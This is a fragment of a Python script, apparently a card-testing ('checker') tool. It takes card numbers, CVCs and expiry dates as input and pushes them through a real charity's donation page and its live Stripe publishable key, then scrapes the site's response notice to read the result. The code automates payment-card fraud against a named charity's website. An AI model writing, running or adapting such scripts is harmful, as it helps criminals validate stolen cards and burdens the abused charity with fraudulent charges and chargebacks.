...
def donate():
    ...
    r.post('https://www.unitedwaykitsap.org/wp-admin/admin-ajax.php', cookies=r.cookies, headers=headers, data=data)
    ...
    data_stripe = f'type=card&billing_details[name]={name}+{name}&billing_details[email]={email}&card[number]={input_data["number"]}&card[cvc]={input_data["cvc"]}&card[exp_month]={input_data["exp_month"]}&card[exp_year]={input_data["exp_year"]}&payment_user_agent=stripe.js%2F1e42d46cc8%3B+stripe-js-v3%2F1e42d46cc8%3B+split-card-element&key=pk_live_tL7CLPLhwWj0ufyKvozklYDB'

    
    response_stripe = r.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data_stripe)
    sync = response_stripe.json()
    xp = sync.get('id')
    ...
    response_final = r.post('https://www.unitedwaykitsap.org/Donate/', params=params, cookies=r.cookies, headers=headers, data=data_final).text

    xxp = re.search(r'<div[^>]*class="[^"]*give_notices[^"]*"[^>]*>(.*?)</div>\s*</div>', response_final, re.DOTALL)
    if xxp:
